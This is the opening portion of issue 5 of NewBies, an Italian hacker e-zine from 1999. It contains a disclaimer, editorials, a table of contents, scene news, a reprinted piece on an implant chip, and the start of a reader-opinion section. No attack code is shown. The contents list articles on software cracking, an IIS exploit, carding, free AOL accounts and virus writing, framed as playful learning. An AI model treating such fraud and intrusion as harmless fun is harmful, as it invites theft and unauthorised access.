
                 @-,”ל'ל”,.,”ל'ל”,.,”ל'ל”,.,”ל'ל”,.,”ל'ל”,-@
                 |   _   _               ____  _           |
                 |  | \ | | _____      _| __ )(_) ___ ___  |
                -+- |  \| |/ _ \ \ /\ / /  _ \| |/ _ Y __|-+-
                 :  | |\  |  __/\ V  V /| |_) | |  __|__ \ :
                 |  |_| \_|\___| \_/\_/ |____/|_|\___|___/ |
                 @-,”ל'ל”,.,”ל'ל”,.,”ל'ל”,.,”ל'ל”,.,”ל'ל”,-@

                       NEW BIES (num 5) (data 20/10/99)

             [ powered By ZeroCool - N0bodY88 - Dante Alighieri ]

                              DISCLAIMER LEGALE
------------------------------------------------------------------------------
  IL NEWBIES STAFF NON SI ASSUME NESSUNA RESPONSABILITA' X L'UTILIZZO DELLE
  TECNICHE SOTTO RIPORTATE, LE QUALI SONO STATE DISTRIBUITE UNICAMENTE X
  CONDIVIDERE LE CONOSCENZE DA NOI "ACUISITE" (mitico edu...) E PER CERCARE
  QUALCUNO CON CUI CONFONTARE LE NS ESPERIENZE E LE CONOSCENZE X MIGLIORARE
  VICENDEVOLMENTE.....DIVERTENDOSI!           N0bodY88 of NewBies Staff
------------------------------------------------------------------------------

                                    PREMESSA
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
Questa e-zine e' nata in una giornata qualsiasi di gennaio, mentre 2 newbies
stavano parlando tra loro in IRC di non mi ricordo cosa. Da quel fatidico
giorno la e-zine e' cresciuta, le persone che ho contattato x scrivere un
articolo mi hanno dato la loro disponibilita' e entro alcuni giorni mi hanno
fatto avere il loro operato. Alcune persone hanno fatto tardi x notti intere
(fra cui il sottoscritto) ed hanno sacrificato il loro tempo x creare qualcosa
che fosse nuovo, divertente, che ci facesse diventare + bravi, + amici, + uniti
e forse...beh...forse anche + famosi...hihihi! Questo e' quello che abbiamo
realizzato  insieme, collaborando e scambiandoci opinioni. Se questa e-zine
non vi piace, e' troppo semplice o e' stupida non scriveteci (oppure scriveteci
x migliorare un art. della e-zine sfruttando le vostre conoscenze) ma se solo
sara' piaciuta ad una persona, se solo un ragazzo dopo aver letto questa avra'
deciso di passare a linux, di programmare in visual basic, di farsi una propria
backdoor o di mettersi a studiare come si usa telnet (troppo poco attrezzato di
voci nei menu x essere quello tanto decantato dovunque, ma anche troppo simpatico
con il suo prompt a mo di Commodore 64) allora questa e-zine sara' servita a
qualcosa. E ricordate...newbies si nasce, hacker si diventa.
Buona lettura ^__^                                               N0bodY88
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                                 INTRODUZIONE:

Salve a tutti questa volta la intro la faccio io N0bodY88 x darvi il benvenuto
a questo 5ר numero del ns progetto NewBies, x farvi una precisazione e x dare
il benvenuto ad un amico. Prima di tutto diamo un caloroso abbraccio (solo
virtuale pero', a meno che siate ragazze, nel qual caso scrivete a dantuzzo!)
al mitico Dante Alighieri x la sua "nomina" a co-redattore insieme a me e al
(mericano ormai ;) ZeroCool. Mi e' sembrato giusto nominare in tal senso il
ns Dantuzzo x il semplice fatto che ha sempre scritto art e soprattutto si e'
sempre sbattuto a cercare articoli e a chiederli a chi incontrava. Per questo
(ma forse lo avevate gia' visto) ho deciso di metterlo nei [powered by...]
il che mi e' sembrata na cosa giusta e carina. L'altra cosa che dovevo dirvi
in primis e' che da questo numero NewBies sara' composto (come e' successo in
passato ma non lo abbiamo mai dichiarato) di due parti fondamentali. Una
in cui gli art vengono scritti x newbies o cmq x chi ha bisogno di una mano,
e una in cui gli art saranno di un livello un po' + elevato (piccoli newbies
crescono) e x non equivocare sappiate che i miei art sono nella prima zona :)
Siccome io non sono dio e non voglio separare le acque (=gli art), imo gli
art continueranno ad essere messi tutti insieme cosi' che chi non conosce
qualcosa di base possa trovare in NewBies una piacevole lettura, e "forse"
d'aiuto. Gli altri, ovvero quelli che girano nella scena gia' da un po',
ovvero quelli che come dice un amico NON "sono ai primi telnet, rlogin..."
potranno (si spera ;) trovare in NewBies qualke art un po' piu' difficile,
qualke spunto x una vita migliore su pc e qualke articolo molto ben fatto
(vedi in questo num |CyRaX|). Imo (in my opinion) chiunque si impegni, usi
del tempo e un po' di testa sara' da ammirare indipendentemente dall'argomento
del suo articolo e dall'"livello tecnico" dello stesso. Per tali motivi quindi
non stupitevi di trovare sullo stesso numero art di base di linux e art +
avanzati. La ns filosofia e' questa: le cose sono facili quando si sanno...ma
se non si sanno? Li', tentiamo di inserirci noi di NewBies con ogni nuovo
numero ma siamo anke contenti ed orgogliosi di presentarvi articoli un po' -
di base giuntici da chi e' - newbies e + hacker. Io dal canto mio vi dico
subito che sono ankora un newbies quindi se aspettate un art. tosto da me...
be...aspettate il 30esimo num di NewBies allora =) (se va bene!!!) eheheh
Detto cio' non mi resta altro che augurarvi buona lettura e consigliandovi
di leggere, provare, sperimentare, progettare, inventare, provare, creare,
modificare e anke...se bisogna...reinstallare ;) 

                                                        N0bodY88

"Pippo diventa pazzo quando minni gli lecca il c...." Robertino Rulezza!!!!
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

ֹֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֻֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
÷   ARTICOLO   ּֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ־ֽ¹      AUTORE     ÷
ּֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¹
|PREMESSA                                                         N0bodY88       |
|INTRODUZIONE                                                     ZeroCool       |
|NOVITA'                                                          NewBies Staff  |
³   SMAU, CRYPTO, BFI, SPP, WANNABE, AIS, NEWS, UNI, DISLESSICI   N0bodY88       ³
³   CHIP TELEMATICO                                               N0bodY88       ³
³   LINUX & CO                                                    N0bodY88       ³
³   COME GIUDICANO NEWBIES I NS LETTORI (E NON)?                  N0bodY88       ³
|INFO SUGLI ALLEGATI                                              NewBies Staff  |
³   2 PAROLE SUGLI ALLEGATI                                       N0bodY88       ³
|PROGRAMMAZIONE                                                   NewBies Staff  |
³   LA PROGRAMMAZIONE DEI SOCKET AD USO ED ABUSO DEI CEREBROLESI  Master         ³
³   CONVERSIONE DI PROGRAMMI UNIX -> WINDOWS                      Master         ³
³   IL LINGUAGGIO HTML - FONDAMENTALI                         *** Firebeam       ³
|CRITTOGRAFIA                                                     NewBies Staff  |
³   GLI ALGORITMI IN USO NEL PGP                                  [aLT255]       ³
³   ALGORITMO WIPE-WAY (PROTEGGIAMO I NOSTRI DATI                 Quequero       ³
|CRACKING                                                         NewBies Staff  |
³   TRASFORMARE UN PROGRAMMA IN UN GENERATORE DI CHIAVI           +MaLaTTiA      ³
³   ACDSEE32 2.41 CRACKING                                        Cod            ³
³   MA QUANTO MI COSTI 3.0                                        Ritz           ³
³   TRESSETTE 3.0 CRACKING                                        Cod            ³
³   COME INSERIRE UNA NUOVA SEZIONE E UNA NUOVA FUNZIONE IN UN PE Pusillus       ³
³   DIAMO I NUMERI CON WINAMP                                     Johnny         ³
³   BUDDYPHONE 2.03 CRACKING                                      Cod            ³
|TEORIA                                                           NewBies Staff  |
³   INTERATTIVITA'                                                [-W|NZ-]       ³
³   TRATTATO SULLA SICUREZZA INFORMATICA                          ZeroCool       ³
³   MAXI GUIDA SU COME FARSI UN CD-ROM CON CDRWIN 3.7C            Nitro The Demon³
³   COME CALCOLARE IL CODICE FISCALE                              Vejeta99       ³
|TRADUZIONI                                                       NewBies Staff  |
³   PROTOCOLLO INTERNET RELAY CHAT - RFC 1459                 *** [Ironman]      ³
³   BREVE CONFRONTO COMANDI TRA VMS E UNIX                        N0bodY88       ³
|LE INTERVISTE E LE NOTTATE IMPOSSIBILI                           NewBies Staff  |
³   INTERVISTA ALLO SMILZO                                        N0bodY88       ³
³   ARTICOLOZZO BY HARLOK - BLINKING - N0BODY88                   CrAzYsTaFF     ³
³   SMAU 4 INSANES                                                _p0nic0_       ³
|PHREAKING                                                        NewBies Staff  |
³   IL SISTEMA GSM                                            *** Nick1          ³
³   PHREAKING, SEGRETERIE E CAZZATE VARIE                       mR_bIs0n-Mr_Skull³
³   MAMMA TELEKOM DIVENTA + FURBA                                 ReZ            ³
³   E' POSSIBILE COPIARE SCHEDE MAGNETICHE?                       N0bodY88       ³
|LINUX - UNIX - VARI                                              NewBies Staff  |
³   I COMANDI FTP                                                 Napo           ³
³   OTTENERE IL ROOT SENZA DIGITARE PASSWORD ALCUNA               Avogrado       ³
³   ALCUNE UTILITY INDISPENSABILI                                 Zippy2k        ³
³   COME FUNZIA L'HPING                                           DarK_Elf       ³
³   MINI DISTRIBUZIONI LINUX                                      JohnnyRunner   ³
³   COMANDI PER LA GESTIONE DI FILESYSTEMS                        Barninga Z!    ³
³   SHELL- LOCK                                                   |_|R|<3S       ³
³   JOBS DI SHELL                                                 rwxrw-r-x      ³
³   MTOOLS OVVERO COME VIVERE IN DOS SOTTO LINUX ;)               N0bodY88       ³
|IL MONDO DI IRC                                                  NewBies Staff  |
³   HACK IRC                                                      Th3_1n7rud3r   ³
³   SCRIPT X MIRC (PER L'UTILIZZZO DI UN BOT)                     XuNiL          ³
|HACKING DI TUTTO DI PIU' E DIVERSI ART. MOLTO INTERESSANTI       NewBies Staff  |
³   WINGATE WITH ALL 1.0                                          |CyRaX|        ³
³   X.25 FOR FUN AND PROFITS, BUT MUCH MORE FOR FUN               L0rD`n0p1      ³
³   HACKING: TUTTO QUELLO CHE C'E' DA SAPERE                      M4VER1CK       ³
³   COME CAMBIARE QUEL BRUTTO START SUL MENUZ AVVIO IN WINZ       Vejeta         ³
³   COSA SI PUO' FARE IN UNA WEB-CHAT (X rEaL NEWBIEs)            F3D3R1[0       ³
³   GOCCIA A GOCCIA...IL VASO TRABOCCA                            Dante Alighieri³
³   EXPLOIT PER IIS SERVER V 4.0                                  AX1S           ³
³   COME FAR DIRE IL ROSARIO ALL'UTENTE DI WINDOWS                The_Intruder   ³
³   BUG DELLE ROULETTE DA BAR                                     Jenji & Avatar ³
³   FOTTING                                                       mR_bIs0n       ³
³   BREVE RIFLESSIONE SUL MILLENIUM BUG...                        Cod            ³
³   PROTAGORA RULEZZA!!!                                          Dante Alighieri³
³   CARDING TUTORIAL (OVVERO LA GUIDA DEL "CARDATORE ITALIANO")   XaRaBaS        ³
³   AMERICAN ON LINE (COME AVERE UN ABBONAMENTO GRATIS)           XuNiL          ³
³   LA DURA ARTE DEL WRITING                                  *** r3b0oT         ³
|PROGRAMMAZIONE VIRALE                                            NewBies Staff  |
³   VIRUS PROGRAMMING (BASIC)                                     XaRaBaS        ³
|SALUTI                                                           NewBies Staff  |
|THIS NUMBA IS DEDICATED BY N0bodY88 TO:                          N0bodY88       |
|CHIAVE PUBBLICA PGP BY N0bodY88                                  N0bodY88       |
ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ

*** = gli articoli seguiti dai precedenti 3 asterischi sono allegati nello zip
      della e-zine a causa della loro diversa natura dal normale txt (es: il
      caso del doc sui gsm di Nick1 che e' in .pdf leggibile tramite il prog
      Acrobat Reader) mentre in altri casi anke se si poteva convertire in
      txt e' stato scelto di lasciare il file cosi' come era (es: la guida
      di html di Firebeam in .html ). E questo e' quanto ;)

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°²²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°²²°°°°°°°°°°°°°°°°°°°²°°°°°°°°°°°²
²°°°°°°°°°°°°°°°²²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

     ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
     ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
     ÷³   SMAU, CRYPTO, BFI, SPP, WANNABE, AIS, NEWS, UNI, DISLESSICI   ³÷
     ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
     ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Ecco qui le novita' avvenute negli ultimi tempi che vi andro' ad elencare
col mio solito modo:

SMAU: quest'anno allo Smau si e' svolto una specie di hack-it99b e x questo
      sono stati visti i seguenti acari informaticus: c'era una folta
      rappresentanza del BFI staff, alcuni dei Ring0, alcuni (purtroppo pochi)
      Spippolatori, neo-spp e simpatizzanti, si e' visto qualkuno della
      olografix (Smilzo :), alcuni (che se no me se sentivo 'npo' solo;) del
      NewBies Staff e ho conosciuto e rivisto + amici di quelli che sognavo!
      In + nascosti tra stand, pezzi di fig... etc sono riuscito a scovare
      (grazie bb!) il coautore di Spaghetti Hacker ovvero il mitico Andrea
      Monti con cui ho fatto una piacevole chiacchierata sulla validita' dei
      disclaimer, e un altro grande rappresentante della scena italiana, cioe'
      +Malattia che colgo l'occasione x salutare e al quale mando un "in culo
      alla balena" x cio' che sta realizzando e che speriamo di potervi far
      sapere presto :) Un grande saluto va a RigoR MorteM (tnx x il libri di
      Mishima), ad Harlok degli Spaghetti (x i cd, la robba, la pizza alle 4
      di mattina e), a Blinking (x cio' che sa lui), a Berry (x la maglietta
      che portava allo Smau con scritto su Berry Rulez!!!!), all'indimentica
      bile Jamil (x il + grande abbraccio che abbia mai dato e ricevuto :), e
      a Vecna x avere reso possibile il fatto che uno che scriveva su NewBies
      possa scrivere su BFI :)
      Purtroppo dopo i 2 gg di sab/dom dello smau ognuno e' dovuto tornare a
      casa dalla findanzata o dai genitori e dai soliti problemi, ognuno
      con in cuore la speranza di rivedersi prima possibile e con la felicita'
      di avere abbinato qualke altra faccia a qualke altro nick...
      ultimo ps: zerocool...cavallo...xoanon...pigpen dove eravate???

CRYPTO: tra le novita' di questo numero vi presnto con molto piacere il sito
        di aLT255 che si intitola crypto...come mai? Semplice, ci chiama cosi'
        xche' tratta di tutto quello che riguarda la crittografia e infatti
        potete trovarvi di tutto (sorgenti, articoli in italiano soprattutto
        (o tradotti) spiegazioni dei vari metodi crittografici e molto altro
        quindi...inutile dire che se non ci andate verrete picchiati a sangue
        con una copia rilegata di NewBies 3 ==) e credetemi fa male!!! hihihi
        Complimenti ancora ad aLT255 e x il link...be...lo trovate nella ns
        lista dei link ai siti migliori echecaspiterina!!! Cmq x i pigri che
        non vogliono scorrere le pagine fino ai link --> http://kz.cjb.net

BFI: allora BFI e' sempre + sulla cresta dell'onda e anke se non sono stati
     sfornati nuovi numeri da potervi consigliare posso solo dirvi di aspet
     tare moooolto impazientemente xche' ho visto alcuni art di quelli che
     comporranno BFI 7 e ho anke saputo di alcuni dei nuovi autori e credetemi
     di qualunque gruppo siate e/o a qualunque "stato" siate (hacker-newbies-
     peggio!!!) non potrete che rimanere a bocca aperta solo scorrendo un
     attimo la lista degli articoli con a lato gli autori...che dire...il
     sito lo sapete...ahhhhh...mi scusino ancora quelli del S0ftpj x l'errato
     link dato in NewBies 4...errare umanum est (come? si vede che ho fatto
     ragioneria??? da cosa???? hihihi)

SPIPPOLATORI: novita' novita'!!! Allora in questo ultimo periodo in casa Spp
              ci sono state molte novita' a partire dalla nuova bi-faccia del
              sito Spp ora in versione testo e versione grafica (curata dal
              l'esperto grafico Ergoline). Come sempre i ns complimenti ai
              webmaster RigoR MorteM e Ergoline. Ma c'e' un'altra novita'!!!
              Quale??? direte voi! Ebbene si e' uscito NetRunners 8 e io me
              lo sto leggendo di notte (l'unico momento in cui riesco a
              leggere in questo periodo!) divorandone pagine e pagine quindi
              browser puntati al sito www.spippolatori.com e puntate un okkio
              ai riddle di Master x vedere se riuscite a risolverli...ps...
              saluti allo Spippolatore Wurzel (altro orgoglioso della "scuola"
              NewBies) e al/la piccolo/a wurzellino/a che sara' uno dei nuovi
              guru-hacker tra 6-7 anni ;) (T. Morris rulezzzzz)

WANNABE: non conoscete Wannabe???? Allora fatevi un giro sul fantastico sito
         http://www.attilahack.cjb.net e li' potete trovare la nuovo (e
         promettente) e-zine Wannabe fatta dagli Attila Hack e Wannabe Staff
         che potete scaricare e leggere comodamente offline oppure (se siete
         all'uni e nun pagate voi la bolletta ;) leggere direttamente online.
         Su questa nuova e-zine c'e' da dire che ci sono ottimi articoli e lo
         staff che ci sta dietro sembra essere molto competente e con un bel
         po' di esperienza alle spalle. Per i lettori va un "leggetevela
         subito!!!" mentre allo staff di Wannabe e a Bobo vanno i miei
         complimenti x l'ottimo risultato ottenuto e un bocca in lupo x i
         prossimi numeri che prevedo non deluderanno il pubblico di newbies
         e/o hacker.

ANARCHY IN THE SYSTEM: la conoscete???? Se non la conoscete AIS e' un'altra
                       e-zine uscita da poco interessante x chi si sente
                       anarchico ma che offre anke buoni articoli di
                       cracking, hacking e phreaking quindi io una letta ve
                       consiglio di sicuro...dove trovarla? Eccovi la risposta
                       http://aisprod.tsx.org Colgo l'occasione x fare i
                       complimenti allo staff di AIS e all'ottimo OlDiroN 61
                       che ha avuto il fegato di creare questa e-zine e di
                       provare con questo progetto che spero diventi presto
                       un punto di riferimento come lo sono diventate BFI
                       e NetRunners degli amici Spp.

DISLESSICI: x i poki malati di mente che non conoscessero questo notissimo
            (a ben donde) sito (http://www.dislessici.org) fatto dall'omonimo
            gruppo sappiate che i Dislessici sono un gruppo di esperti smanet
            toni di Unix e Linux che si dedicano alla programmazione e allo
            studio dei vari sistemi operativi Unix e Unix like e che sfornano
            testi su testi di studi sui suddetti so. Da notare anke gli ottimi
            articoli di crittografia presenti sul sito e la grafica stessa del
            sito. X chi avesse nostalgia delle gesta del gruppo Il Timone vi
            e' poi la sezione Lamer dove capirete xche' Timone e Lamah vanno
            cosi' d'accordo. Colgo l'occasione x salutare Nt Flander e
            LordFelix entrambi ottimi amici pronti ad aiutare sia x problemi
            inerenti i pc sia x dare una mano "psicologica" (diciamo che senza
            lordfelix NewBies 5 non sarebbe uscita...e non so se sarebbe
            stato un bene =) hihihi).

NEWS: poche righe x dirvi di un sito dove vi sono News, di hacking crittogra
      fia cracking e phreaking e tutto cio' che fa parte del ns mondo, che
      vengono aggiornate ogni gg!!! Dove, direte voi??? Ma dove se non sul
      stramegaextraconosciuto sito www.s0ftpj.org dove Black Berry non si
      puo' certo lamentare di non avere un cax da fare quindi...andateci
      in massa!!!!!!

                                                        N0bodY88

"La sicurezza di un crittosistema non deve dipendere dalla segretezza del
l'algoritmo usato, ma solo dalla segretezza della chiave"      Kerckhoffs
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                       ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                       ÷ִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                       ÷³    CHIP TELEMATICO     ³÷
                       ÷ְִִִִִִִִִִִִִִִִִִִִִִִִ÷
                       ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Nell'ultimo numero delle "Novita' su VOLftp" e' stato pubblicato il seguente
articolo che ho ritenuto opportuno portare alla vs attenzione x potervi dire
che il cyberpunk e' sempre + vicino, gli innesti non sono poi cosi' lontanti
e Gibson, Sterling e il strafantastico Akira Mishima non erano poi cosi' tanto
visionari come si pensava ;) Cmq sta a voi decidere se cio' che segue e' una
bella notizia o no quindi che altro dirvi? Buona lettura :D

Il chip telepatico
==================

Quali strabilianti invenzioni ci attendono nel nuovo
millennio? Kevin Warwick, docente di cibernetica all'Universita' britannica
di Reading, e' assolutamente convinto sia possibile collegare un chip al
complesso sistema nervoso dell'uomo. Secondo il ricercatore inglese
entro qualche anno sara' possibile testare il chip anche sul piano
telepatico.
Il grande obiettivo da raggiungere per Warwick e' quello di
creare un chip tale da permettere agli uomini di comunicare con il
pensiero. Di interagire con i computer e con le macchine che ne hanno uno
(un sistema elettronico con chip ricevente), di compiere azioni
semplicemente pensandole. Un chip che potrebbe cambiare il mondo!
Il primo passo di questa incredibile ricerca e' l'innesto,
sara' effettuato entro breve, del chip sperimentale nel braccio  di
un volontario: si dovra' testare, come prima cosa, la
compatibilita' del chip con l'arto umano.
Una volta risolti eventuali problemi di innesto del chip nel
corpo umano si passera' subito ad esperimenti pratici: comunicazione tra
umano e macchine (per l'esecuzione di semplici ordini). Warwick
assicura che entro la meta' del prossimo secolo si riuscira' a  comunicare
le emozioni telepaticamente. E dopo le emozioni si tentera' di
trasmettere, per via telepatica, anche vere e proprie frasi. 

Un tnx alla redazione di VOLftp e all'autore di tale articolo (se qualcuno
ne conosce il nome me lo dica che lo mettero' nel num di NewBies successivo).

                                                          N0bodY88

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                        ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                        ÷ִִִִִִִִִִִִִִִִִִִִ¿÷
                        ÷³     LINUX & CO     ³÷
                        ÷ְִִִִִִִִִִִִִִִִִִִִ÷
                        ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Innanzitutto scusate se vi sto aumentando sempre piu' il tempo che vi stacca
dall'arrivare ai vari articoli di NewBies ma credetemi sta volta e' x una
nobile causa. Allora conoscete Linux & co? Noooooooo!!!!!! E allora che
aspettate... correte in edicola! In edicola, direte voi, e che ci vado a fa?
Li' non c'e' nessun giornale dedicato esclusivamente a Linux!! Ebbene questo
e' vero, o meglio...era vero xche' dal 20 ottobre in tutte le edicole di
Italia troverete il bellissimo giornale Linux & co creato dal gruppo
Dislessici in collaborazione con altri (i.e. AntiRez). Ve lo consiglio xche'
sono stato uno dei fortunati a sapere che allo smau vi era il numero 0 gratis
presso lo stand della Red Hat e ad essere sincero me lo sono pappato in 4 gg
e devo dire che e' dedicato sia a chi come me apprezza sempre art sui tipi
di distribuzione e sui loro vantaggi e svantaggi x decidere che cosa
installare, ma anke a chi voglia studiarsi un po' meglio linux o voglia darsi
al compilare con gcc (ottimo quell'art). Finisco col consigliarvi quindi di
andare subito in edicola a comprarlo forte del fatto che dal numero 1 sara'
accluso anke un cd con tante belle cosucce x i ns linuzzi vergini e non.

Tanti complimenti alla redazione di Linux & co e a tutti quelli che hanno
contribuito a creare e portare avanti un'altra di quelle cose atipiche e
fuori coro, come lo sono gia' state il libro Spaghetti Hacker, il libro
Segreti, Spie e codici cifrati e il fresco di stampa Open Source altro
prodotto uscito dalle mani di Andrea Monti, che, credetemi, e' uno con 2
palle cosi' !!!!!

Direttamente dall'agglomerato                           N0bodY88                                                
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

            ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
            ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
            ÷³ COME GIUDICANO NEWBIES I NS LETTORI (E NON)? ³÷
            ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
            ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

PREMESSA: chi mi conosce sa che non ho mai voluto fare una classifica delle
          e-zine momentanemante attive e non ho mai voluto neanche fare
          confronti forte del fatto che qualunque e-zine, anke se (come noi)
          alcune volte con poche nozioni tecniche o poche novita', sia da
          elogiare x il semplice fatto che esista e x il fatto che chi ha
          scritto si e' fatto un ( )( ) cosi' o ha sudato sangue x ogni kb
          conquistato. Conosco quasi tutti i redattori delle altre riviste
          e da quello che ho potuto notare anke loro credono nell'aiuto
          reciproco e se fanno critiche il 100% delle volte sono costruttive.

ALLORA XCHE' QUEST'ARTICOLO?: in vita mia non mi sono mai sentito migliore di
          nessuno, ho trattato (o meglio cercato di trattare) sempre tutti
          allo stesso modo, si chiamasse il mio interlocutore \sPIRIT\ di BFI
          o pincusdepalla di vatelapesca. Per il ns progetto NewBies (dove x
          ns intendo di tutti quelli che hanno dato una mano a crearla e a
          continuarla, xcio' anke tutti voi che leggete) e' stata sempre la
          stessa cosa, io chiedevo art e parlavo con chi scriveva e/o leggeva
          forte del fatto che anke la + grande/piccola critica potesse portare
          ad un ulteriore miglioramento della rivista e (forse) delle ns idee.
          Piu' di una volta mi sono sentito dire che newbies non era bella e
          che quello che scrivevavmo erano cose banali e x questo non mi sono
          mai offeso x il semplice fatto che le cose sono semplici se le sai
          ...ma se non le sai? Cio' deriva anke dal fatto che x ogni hacker/
          smanettone/cracker/phreaker etc ce ne sono 1000 che vogliono
          imparare o vanno anke solo in cerca di un piccolo aiuto, il link
          giusto, la spiegazione di 10 parole che pero' ci fa capire un tut
          di 20 pag! Proprio x questo motivo nessuno di noi ha mai affermato
          (e se qualcuno l'ha fatto che gli si possano incollare le dita alla
          tastiera tecnosciamanica di PigPen!!!) che NewBies e' la migliore
          rivista in giro, che quello che diciamo noi e' 100% nuovo o che
          sono cose mai viste. Questo lo possiamo lasciare dire allo staff
          s0ftpj di BFI che ne hanno molto piu' diritto. Ma allora xche' hai
          voluto raccogliere un po' di opinioni su cosa ne pensava la gente di
          NewBies?Il motivo e' questo. Una 20ina di gg fa un gruppo di persone
          di cui non voglio fare nomi hanno cominciato a tartassarmi di frasi
          del tipo "Newbies e' una e-zine lamer" "Newbies non e' neanke una
          e-zine" "NewBies fa skifo" "Voi fate vergognare bfi di esistere" e
          altre cosucce di questo genere tutte cosi' carine, alche' mi sono
          detto "e se questo fosse il pensiero di tutti?". Allora mi sono
          messo a "rompere" letteralmente le balle a tutti quelli che
          incontravo facendo la fatidica domanda: "che ne pensi di NewBies?"
          Il mio intento non era quindi quello di vantarmi o deprimermi
          mostrando le risposte su questo num di NewBies ma era vedere se
          effettivamente era come me la aveva descritta quel gruppo di persone
          e se fosse stato come e' stato (fiuuuu) saremmo andati avanti,
          altrimenti avremmo detto "ok e' stata una bella esperienza, abbiamo
          conosciuto molta gente e siamo migliorati insieme". Vi lascio ora
          con un po' di risposte di gente +o- conosciuta (imo poco importa)
          x dimostrare a quel gruppo di persone che almeno non sono l'unico
          x il quale NewBies e' utile o anke solo un po' piacevole:

DOMANDA: Che ne pensi di NewBies?
RISPOSTE:

רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY ANONIMO
